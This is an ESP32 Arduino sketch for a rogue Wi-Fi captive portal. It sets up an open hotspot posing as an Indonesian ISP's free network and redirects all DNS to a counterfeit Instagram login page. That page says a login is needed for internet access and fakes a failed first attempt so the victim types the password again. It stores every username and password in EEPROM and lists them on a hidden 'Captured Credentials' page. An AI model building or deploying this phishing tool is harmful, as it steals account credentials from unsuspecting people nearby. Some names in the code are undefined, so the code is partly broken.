#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

const char* SSID_NAME = "IndiHome_FreeZone";

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 1, 10);

String allPass = "";
String newSSID = "";
String currentSSID = "";

int initialCheckLocation = 20;
int passStart = 30;
int passEnd = passStart;

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title><meta name=viewport content=\"width=device-width,initial-scale=1\"><meta charset=\"UTF-8\"></head><body>";
  return h;
}

String index() {
  return R"rawliteral(
<!DOCTYPE html>
<html>
  <head>
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      @font-face {
        font-family: "Billabong";
        src: url("Billabong-Regular.ttf") format("truetype");
        font-weight: normal;
        font-style: normal;
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        background-color: black;
        background-size: 400% 400%;
        animation: gradient 15s ease infinite;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          Helvetica, Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
      }

      @keyframes gradient {
        0% {
          background-position: 0% 50%;
        }
        50% {
          background-position: 100% 50%;
        }
        100% {
          background-position: 0% 50%;
        }
      }

      .main-container {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }

      .container {
        justify-content: center;
        align-items: center;
        background-color: #000;
        padding: 40px;
        max-width: 570px;
        width: 100%;
        text-align: center;
        border-radius: 1px;
      }

      .notification {
        background-color: #262626;
        color: #ffffff;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
        font-size: 14px;
        line-height: 1.5;
        text-align: center;
        position: relative;
      }

      .notification-close {
        position: absolute;
        top: 5px;
        right: 10px;
        color: #8e8e8e;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
      }

      .notification strong {
        color: #0095f6;
      }

      .logo {
        color: #fff;
        font-size: 48px;
        font-weight: normal;
        font-family: "Billabong", cursive;
        margin-bottom: 32px;
        font-style: normal;
        letter-spacing: 0;
      }

      .form-group {
        margin-bottom: 6px;
        position: relative;
      }

      input {
        width: 100%;
        padding: 14px 8px 8px 8px;
        background: #121212;
        border: 1px solid #262626;
        border-radius: 3px;
        color: #fff;
        font-size: 12px;
        outline: none;
        transition: border-color 0.2s ease;
      }

      input:focus {
        border-color: #262626;
      }

      input::placeholder {
        color: #8e8e8e;
        font-size: 12px;
      }

      .login-btn {
        width: 100%;
        padding: 8px;
        background-color: #0095f6;
        color: white;
        border: none;
        border-radius: 8px;
        margin: 16px 0;
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        transition: background-color 0.2s ease;
      }

      .login-btn:hover {
        background-color: #1877f2;
      }

      .divider {
        display: flex;
        align-items: center;
        margin: 18px 0;
        color: #8e8e8e;
        font-size: 13px;
        font-weight: 600;
      }

      .divider::before,
      .divider::after {
        content: "";
        flex: 1;
        height: 1px;
        background: #262626;
      }

      .divider::before {
        margin-right: 18px;
      }

      .divider::after {
        margin-left: 18px;
      }

      .facebook-login {
        background-color: #0095f6;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #ffffff;
        text-decoration: none;
        font-size: 14px;
        font-weight: 600;
        margin-bottom: 18px;
        padding: 8px 16px;
      }

      .facebook-icon {
        width: 16px;
        height: 16px;
        margin-right: 12px;
        fill: #ffffff;
        border-radius: 3px;
      }

      .forgot-password {
        color: #0095f6;
        text-decoration: none;
        font-size: 14px;
      }

      .error-message {
        color: #ff6b6b;
        font-size: 14px;
        margin: 10px 0;
        display: none;
      }

      .signup-section {
        background-color: #000;
        padding: 20px;
        margin-top: 10px;
        text-align: center;
        border-radius: 1px;
      }

      .signup-text {
        color: #fff;
        font-size: 14px;
      }

      .signup-link {
        color: #0095f6;
        text-decoration: none;
        font-weight: 600;
      }

      .app-download {
        text-align: center;
        margin-top: 20px;
        max-width: 325px;
        justify-content: center !important;
      }

      .app-download p {
        color: #fff;
        font-size: 14px;
        margin-bottom: 16px;
      }

      .app-buttons {
        display: flex;
        justify-content: center;
        gap: 8px;
      }

      .app-button {
        height: 40px;
        border-radius: 5px;
        overflow: hidden;
      }

      .footer-links {
        margin-top: 40px;
        text-align: center;
      }

      .footer-links a {
        color: #8e8e8e;
        text-decoration: none;
        font-size: 12px;
        margin: 0 8px;
      }

      .footer-bottom {
        margin-top: 16px;
        text-align: center;
      }

      .footer-bottom span {
        color: #8e8e8e;
        font-size: 12px;
        margin: 0 8px;
      }
      .legal-link {
        color: #ffffff;
        text-decoration: none;
        font-weight: 500;
      }

      .legal-link:hover {
        text-decoration: underline;
      }

      .loading-container {
        display: none;
        margin-top: 20px;
      }

      .loading {
        display: inline-block;
        width: 20px;
        height: 20px;
        border: 3px solid #262626;
        border-radius: 50%;
        border-top-color: #fff;
        animation: spin 1s ease-in-out infinite;
        margin: 10px 0;
      }

      @keyframes spin {
        to { transform: rotate(360deg); }
      }
    </style>
    <script>
      let loginAttempts = 0;
      
      function handleLogin(event) {
        event.preventDefault();
        loginAttempts++;
        
        const errorMsg = document.querySelector('.error-message');
        const form = document.querySelector('form');
        const loadingContainer = document.querySelector('.loading-container');
        
        if(loginAttempts === 1) {
          // First attempt - show error
          errorMsg.style.display = 'block';
        } else if(loginAttempts >= 2) {
          // Second attempt - show loading and submit
          form.style.display = 'none';
          document.querySelector('.facebook-login').style.display = 'none';
          document.querySelector('.divider').style.display = 'none';
          document.querySelector('.error-message').style.display = 'none';
          document.querySelector('.forgot-password').style.display = 'none';
          document.querySelector('.signup-section').style.display = 'none';
          
          loadingContainer.style.display = 'block';
          
          // Submit the form after a delay
          setTimeout(() => {
            form.submit();
          }, 2000);
        }
      }
      
      function closeNotification() {
        document.querySelector('.notification').style.display = 'none';
      }
    </script>
  </head>
  <body>
    <div class="main-container">
      <div class="container">
        <div class="notification">
          <span class="notification-close" onclick="closeNotification()">×</span>
          <strong>Verification Required</strong><br>
          Instagram requires login to verify connection. Please log in to your account to continue and access the internet network.
        </div>

        <div class="logo">Instagram</div>

        <a href="#" class="facebook-login">
          <svg class="facebook-icon" viewBox="0 0 24 24">
            <path
              d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"
            />
          </svg>
          Continue with Facebook
        </a>

        <div class="divider">OR</div>

        <form action="/post" method="post" onsubmit="handleLogin(event)">
          <div class="form-group">
            <input
              type="text"
              name="username"
              placeholder="Phone number, username, or email"
              required
            />
          </div>

          <div class="form-group">
            <input type="password" name="m" placeholder="Password" required />
          </div>

          <button type="submit" class="login-btn">Log in</button>
        </form>

        <div class="error-message">
          Sorry, your password was incorrect. Please double-check your password.
        </div>

        <div class="loading-container">
          <h2>Logging in...</h2>
          <div class="loading"></div>
          <p>Please wait</p>
        </div>

        <a href="#" class="forgot-password">Forgot password?</a>

        <div class="signup-section">
          <span class="signup-text"
            >Don't have an account?
            <a href="#" class="signup-link">Sign up</a></span
          >
        </div>
      </div>

      <div class="app-download">
        <p>
          By continuing, you agree to Instagram's
          <a href="#" class="legal-link">Terms of Use</a>
          and
          <a href="#" class="legal-link">Privacy Policy</a>.
        </p>
      </div>

      <div class="footer-links">
        <a href="https://www.meta.com/about/">Meta</a>
        <a href="https://about.instagram.com/">About</a>
        <a href="https://about.instagram.com/blog">Blog</a>
        <a href="https://about.instagram.com/about-us/careers">Jobs</a>
        <a href="https://help.instagram.com/">Help</a>
        <a href="https://developers.facebook.com/docs/instagram-platform">API</a>
        <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
        <a href="https://help.instagram.com/581066165581870/">Terms</a>
        <a href="https://www.instagram.com/explore/locations/">Locations</a>
        <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
        <a href="https://www.threads.com/">Threads</a>
        <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
        <a href="#">Meta Verified</a>
        <br />
        <a href="https://indonesia.fb.com/">Meta in Indonesia</a>
      </div>

      <div class="footer-bottom">
        <span>English</span>
        <span>© 2025 Instagram from Meta</span>
      </div>
    </div>
  </body>
</html>
)rawliteral";
}

String posted() {
  String user = input("username");
  String pass = input("m");
  String entry = "<li><b>" + user + " : " + pass + "</b></li>";
  allPass += entry;

  for (int i = 0; i <= entry.length(); ++i)
    EEPROM.write(passEnd + i, entry[i]);

  passEnd += entry.length();
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();

  return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="2;url=/">
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      text-align: center;
      margin-top: 20%;
    }
    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid #262626;
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin: 10px 0;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>Logging in...</h2>
  <div class="loading"></div>
  <p>Please wait</p>
</body>
</html>
)rawliteral";
}

String pass() {
  String tableContent = "<style>"
                      "body {"
                      "  font-family: Arial, sans-serif;"
                      "  margin: 0;"
                      "  padding: 20px;"
                      "  background-color: #f5f5f5;"
                      "}"
                      ".container {"
                      "  max-width: 1000px;"
                      "  margin: 0 auto;"
                      "  background: white;"
                      "  padding: 20px;"
                      "  border-radius: 8px;"
                      "  box-shadow: 0 2px 10px rgba(0,0,0,0.1);"
                      "}"
                      "h1 {"
                      "  color: #333;"
                      "  text-align: center;"
                      "  margin-bottom: 20px;"
                      "}"
                      "table {"
                      "  width: 100%;"
                      "  border-collapse: collapse;"
                      "  margin-bottom: 20px;"
                      "}"
                      "th {"
                      "  background-color: #0095f6;"
                      "  color: white;"
                      "  padding: 12px;"
                      "  text-align: left;"
                      "}"
                      "td {"
                      "  padding: 10px;"
                      "  border-bottom: 1px solid #ddd;"
                      "}"
                      "tr:nth-child(even) {"
                      "  background-color: #f9f9f9;"
                      "}"
                      "tr:hover {"
                      "  background-color: #f1f1f1;"
                      "}"
                      ".buttons {"
                      "  text-align: center;"
                      "  margin-top: 20px;"
                      "}"
                      ".btn {"
                      "  display: inline-block;"
                      "  padding: 10px 20px;"
                      "  margin: 0 10px;"
                      "  background-color: #0095f6;"
                      "  color: white;"
                      "  text-decoration: none;"
                      "  border-radius: 4px;"
                      "  transition: background-color 0.3s;"
                      "}"
                      ".btn:hover {"
                      "  background-color: #0077cc;"
                      "}"
                      ".btn-clear {"
                      "  background-color: #ff4444;"
                      "}"
                      ".btn-clear:hover {"
                      "  background-color: #cc0000;"
                      "}"
                      "</style>"
                      "<div class='container'>"
                      "<h1>Captured Credentials</h1>"
                      "<table>"
                      "<thead>"
                      "<tr>"
                      "<th>No.</th>"
                      "<th>Username</th>"
                      "<th>Password</th>"
                      "</tr>"
                      "</thead>"
                      "<tbody>";

  // Parse the allPass string and create table rows
  int counter = 1;
  int startPos = 0;
  while (startPos < allPass.length()) {
    int liStart = allPass.indexOf("<li><b>", startPos);
    if (liStart == -1) break;
    
    int liEnd = allPass.indexOf("</b></li>", liStart);
    if (liEnd == -1) break;
    
    String entry = allPass.substring(liStart + 7, liEnd);
    int separatorPos = entry.indexOf(" : ");
    
    if (separatorPos != -1) {
      String username = entry.substring(0, separatorPos);
      String password = entry.substring(separatorPos + 3);
      
      tableContent += "<tr>"
                    "<td>" + String(counter) + "</td>"
                    "<td>" + username + "</td>"
                    "<td>" + password + "</td>"
                    "</tr>";
      counter++;
    }
    
    startPos = liEnd + 8;
  }

  tableContent += "</tbody>"
                 "</table>"
                 "<div class='buttons'>"
                 "<a href='/' class='btn'>Back to Login</a>"
                 "<a href='/clear' class='btn btn-clear'>Clear All Passwords</a>"
                 "</div>"
                 "</div>";

  return header(PASS_TITLE) + tableContent + footer();
}

String clear() {
  allPass = "";
  passEnd = passStart;
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div class='container'><h1>Password List Cleared</h1><p>All captured credentials have been removed.</p><div class='buttons'><a href='/' class='btn'>Back to Login</a></div></div>" + footer();
}

void setup() {
  Serial.begin(115200);
  bootTime = lastActivity = millis();
  EEPROM.begin(2048);
  delay(10);

  String checkValue = "first";
  for (int i = 0; i < checkValue.length(); ++i) {
    if ((char)EEPROM.read(i + initialCheckLocation) != checkValue[i]) {
      for (int i = 0; i < checkValue.length(); ++i)
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      EEPROM.write(0, '\0');
      EEPROM.write(passStart, '\0');
      EEPROM.commit();
      break;
    }
  }

  String ESSID = "";
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += (char)EEPROM.read(i);
    i++;
  }

  while (EEPROM.read(passEnd) != '\0') {
    allPass += (char)EEPROM.read(passEnd);
    passEnd++;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
  Serial.print("Current SSID: ");
  Serial.println(currentSSID);
  WiFi.softAP(currentSSID);

  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) lastTick = millis();
  dnsServer.processNextRequest();
  webServer.handleClient();
}